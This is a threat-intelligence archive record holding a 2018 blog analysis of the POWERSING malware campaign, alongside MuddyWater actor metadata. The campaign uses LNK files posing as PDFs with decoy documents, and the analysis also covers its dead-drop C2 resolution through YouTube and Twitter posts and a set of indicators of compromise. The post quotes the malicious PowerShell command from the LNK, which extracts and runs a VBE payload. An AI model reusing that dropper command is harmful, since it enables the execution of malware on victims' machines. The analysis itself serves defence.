{
    "id": "a8597a49-fa0b-4e23-a4c0-4a2b719bb395",
    "created_at": "2023-01-12T15:02:59.900304Z",
    "updated_at": "2025-03-27T02:16:14.168642Z",
    "deleted_at": null,
    "sha1_hash": "76950c9950804f2819ce53470001cb20be83b81e",
    "title": "2018-12-13 - POWERSING - From LNK Files To Janicab Through YouTube & Twitter",
    "authors": "",
    "file_creation_date": "2022-05-27T22:06:54Z",
    "file_modification_date": "2022-05-27T22:06:54Z",
    "file_size": 425265,
    "plain_text": "# POWERSING - FROM LNK FILES TO JANICAB THROUGH YOUTUBE & TWITTER\n\n**sec0wn.blogspot.com/2018/12/powersing-from-lnk-files-to-janicab.html**\n\nMo Bustami\n\n## INTRODUCTION\n\nThis post will discuss an ongoing campaign that have been operational since at least August 2017. The post will look into the\ndelivery of the malware, some analysis on the payload, and some additional insights in relation to the campaign. It is by no means\na full in depth analysis of the malware and all it's functionality.\n\n## LAWYER UP!!\n\nThis all started with a tweet by the AWESOME Jacob Soo [(@_jsoo_) whom I recommend you go and follow if you are interested](https://twitter.com/_jsoo_)\nin analyzing malware and tracking different threat actors.\n\nThe sample is a ZIP file titled \"Dubai_Lawyers_update_2018.zip\" and the archive contains two LNK files that are perpetrating to\nbe PDF files. The actors in this case borrowed couple of files from the British Embassy site and used them as decoy documents\nto lure victims into believing that these files are in fact legitimate.\n_https://assets.publishing.service[.]gov.uk/government/uploads/system/uploads/attachment_data/file/754075/Dubai_List_of_Lawyers_-_\n__Nov_2018.pdf_\nI took the time to analyze the sample and it seems that it does the following:\n\n\n-----\n\nThe LNK files contain BASE64 strings that once decoded will show some hard coded URLs. We will get back to this in a\nmoment\n\nhxxp://shockchan[.]com/2-girls-1-cup-video/;hxxp://shockchan[.]com/2-girls-1-cup-video/;hxxp://shockchan[.]com/2-girls-1-cupvideo/;hxxp://shockchan[.]com/2-girls-1-cup-video/;hxxps://youtu[.]be/40rHiF75z5o,\nhxxps://brady4th[.]wordpress[.]com/2018/11/15/opener/,hxxps://twitter[.]com/Fancy65716779,\nhxxps://plus[.]google[.]com/u/0/collection/U84ZPF\n\nLNK contains a small PowerShell script that creates a VBE file\n\n_\"/c powershell -c \"$m='Dubai.pdf.lnk';$t=[environment]::getenvironmentvariable('tmp');cp $m $t\\$m;$z=$t+'\\'+@(gci -name $t $m -_\n_rec)[0];$a=gc $z|out-string;$q=$a[($a.length-2340)..$a.length];[io.file]::WriteAllbytes($t+'\\.vbe',$q);CsCrIpT $t'\\.vbe'\"_\n\nVBE file once decoded is responsible for:\n\nCreating the Decoy PDF document\nCreating a PowerShell script from chunks of code within the original LNK file.\nRunning that PowerShell Code\n\nThe resulting PowerShell script is also obfuscated. Once decoded, the script, which is over 900 lines, which I am calling\n**_POWERSING acts as the main payload and construct a dll to run the main functionality of the malware._**\n\nIf we visit some of the URLs that are hard-coded within the LNK samples we will notice a recurring theme that all of them have a\nstring that look like this\n\nThe POWERSING code seems to instructs the victim machine to go to different hard-coded sites (Youtube, Twitter, Google+,\nWordpress, etc) looking for a specific string\n**\"Yo bro i sing\" + BASE64 encoded String + \"My keyboard doesnt work..\" + String of enocded/encrypted characters.**\nBased on this, I was able to find additional links and sites which are probably related to the same campaign.\n\n1. Google Results - hxxps://www.google.com/search?\n\nq=%22Yo+bro+i+sing%22+%2B+%22My+keyboard+doesnt+work..%22&filter=0&biw=1536&bih=723\n2. Youtube Results - hxxps://www.youtube.com/results?\n\nsearch_query=%22Yo+bro+i+sing%22+%2B+%22My+keyboard+doesnt+work..%22\n3. Oldest Youtube Video with such code is from over a year ago - hxxps://www.youtube.com/watch?v=1jrvJD2uKjM\n4. Twitter Results - hxxps://twitter.com/search?\n\nq=%22Yo%20bro%20i%20sing%22%20%2B%20%22My%20keyboard%20doesnt%20work..%22&src=typd\n\n\n-----\n\n5. Reddit Post hxxps://www.reddit.com/user/brain fart yo/comments/9ypxgk/warming_up/\n6. Imgur - hxxps://imgur.com/t/ily/36tbM2J\n\nThe POWERSING code included a function (LongtoIP) that seems to take the Base64 chunk from the above string, decodes it\nand run some mathmatical equations on it to produce the real C2.\n\nBased on this, I was able to calculate 4 different potential C2 servers from the different comments and links I found\n_54.38.192[.]174 – Most recent, from around Mid Nov_\n_91.229.76[.]153_\n_105.104.10[.]115 – Oldest, from Aug 2017_\n_52.67.106[.]251_\nThe first two IP addresses seem to have shared the same SSL cert as shown below\n\n\nimage.png\n\n\n## UNCOVERING ADDITIONAL SAMPLES\n\nI wanted to see if I can find additional samples that could be related to this campaign and after some more digging, I found a\ncouple of older samples going back to Nov 2017.\n**SAMPLE 1 - ITW name: p2_ecamos_Volatility_Strategy_2X[.]pdf.lnk**\n**HASH - e91f0189ed04972ce71fd10631e8830c585908089a38a05a12bd4e43d6e21024**\n**Current Detection – 0/59**\n**SAMPLE 2 - ITW name: ecamos_Volatility_Strategy_2X[.]pdf.lnk**\n**HASH - 0c7e8427ee61672568983e51bf03e0bcf6f2e9c01d2524d82677b20264b23a3f**\n**Current Detection – 0/59**\n\nEcamos seems to be an Investment company off of Switzerland (hxxps://www.ecamos[.]ch/en/)\nThe lure is taken from this most probably:\n_hxxps://www.ecamos[.]ch/downloads/ecamos%20Volatility%20Strategy%202X_factsheet_2018%20November.pdf_\n\nThese samples had these hardcoded URLs:\nhxxp://shockchan[.]com/2-girls-1-cup-video/\n\n\n-----\n\nhxxps://twitter[.]com/sabinepfeffer69/status/928607342177988608\nhxxps://mads281.wordpress[.]com\nhxxps://www.youtube[.]com/watch?v=ZRQ-1I856XA\n\n## ADDITIONAL INSIGHTS AND FINAL THOUGHTS\n\nWhen I first started looking into this I reached out to few peers to get their insights and their expertise and I was not disappointed\nas some of them provided valuable information:\n\n**CALCULATING THE C2**\n\nIn relation to the function responsible for calculating the potential C2 IP addresses, we noticed that 2 values when divided by\n(25835) does produce an integer and have a decimal point. Keeping in mind that based on the variable types identified in the\nfunction, the calculated result will just drop the decimal point; we still wanted to look into potential divider that would produce an\ninteger.\n**Base64: NDU2ODcyODgyNzE4Nzc=**\n**Decoded: 45687288271877**\n**Factor Pairs: (1, 45687288271877) (7, 6526755467411) (29, 1575423733513) (203, 225060533359) (2099, 21766216423)**\n(14693, 3109459489) (60871, 750559187) (426097, 107222741)\n**Calculated C2 IP: 185.86.150[.]33**\n**Base64: MjI2NTI5OTQyOTg5Nzc=**\n**Decoded: 22652994298977**\n**Factor Pairs: (1, 22652994298977) (3, 7550998099659) (7, 3236142042711) (9, 2516999366553) (21, 1078714014237) (27,**\n838999788851) (63, 359571338079) (189, 119857112693) (2099, 10792279323) (2339, 9684905643) (6297, 3597426441)\n(7017, 3228301881) (14693, 1541754189) (16373, 1383557949) (18891, 1199142147) (21051, 1076100627) (24413,\n927907029) (44079, 513918063) (49119, 461185983) (56673, 399714049) (63153, 358700209) (73239, 309302343) (132237,\n171306021) (147357, 153728661) (170891, 132558147) (219717, 103100781) (396711, 57102007) (442071, 51242887)\n(512673, 44186049) (659151, 34366927) (1538019, 14728683) (4614057, 4909561)\n**Calculated C2 IP: 91.229.77[.]77**\nInterestingly, these two IP addresses shared hosting an SSL certificate which even make the potential that this is related to the\nsame campaign even more as shown below\n\n**RE-INTRODUCING JANICAB**\n\nAs I was writing this post, I was pointed toward a blogpost that talks about a malware called (Janicab) that shares a very similar,\nalmost identical TTP and the samples I found could be variants of such malware or using same functionality/code:\n\nhttps://www.f-secure.com/weblog/archives/00002803.html\nhttps://www.f-secure.com/weblog/archives/00002576.html\n\nThis is the first I actually hear of “Janicab” so I don’t have much info about it other than it seems to be cross platform (Mac and\nWindows). The F-Secure posts above covers it in detail and provide more information about it's capabilities.\n\n\n-----\n\nRunning additional searches looking for _Janicab returns more samples that share more similarities with this campaign. If this is_\nindeed related to the Janicab family/operation, that shows that this malware/operation has been going on since at least 2013.\n\n## INDICATORS OF COMPROMISE\n\n**LNK FILES RELATED TO POWERSING**\n\nf4610b65eba977b3d13eba5da0e38788a9e796a3e9775dd2b8e37b3085c2e1af\n\n880607cc2da4c3213ea687dabd7707736a879cc5f2f1d4accf79821e4d24d870\n\n22ede766fba7551ad0b71ef568d0e5022378eadbdff55c4a02b42e63fcb3b17c\n\n4920e6506ca557d486e6785cb5f7e4b0f4505709ffe8c30070909b040d3c3840\n\ne91f0189ed04972ce71fd10631e8830c585908089a38a05a12bd4e43d6e21024\n\n0c7e8427ee61672568983e51bf03e0bcf6f2e9c01d2524d82677b20264b23a3f\n\n**RECENT JANICAB LNK SAMPLES**\n\n621e256d1db0dd41eef73d2dfe8b7db3cde337dce8037c46c6f5fa7e9ce33135\n\n5039e8f97dc499fef344b56270ae534a0cea1c93ddacf17ae46c7f922f6139d8\n\n01960de7c05329b2b8f6e838cdc02c676782b7954d2ff68d8165d412054ce034\n\n**POTENTIAL POWERSING C2**\n\n54.38.192[.]174\n\n91.229.76[.]153\n\n105.104.10[.]115\n\n52.67.106[.]251\n\n185.86.150[.]33\n\n91.229.77[.]77\n\n## PRB-Backdoor - A Fully Loaded PowerShell Backdoor with Evil Intentions\n\n Clearing the MuddyWater - Analysis of new MuddyWater Samples\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-12-13 - POWERSING - From LNK Files To Janicab Through YouTube & Twitter.pdf"
    ],
    "report_names": [
        "2018-12-13 - POWERSING - From LNK Files To Janicab Through YouTube & Twitter.pdf"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535779,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1653689214,
    "ts_modification_date": 1653689214,
    "files": {
        "pdf": "https://archive.orkl.eu/76950c9950804f2819ce53470001cb20be83b81e.pdf",
        "text": "https://archive.orkl.eu/76950c9950804f2819ce53470001cb20be83b81e.txt",
        "img": "https://archive.orkl.eu/76950c9950804f2819ce53470001cb20be83b81e.jpg"
    }
}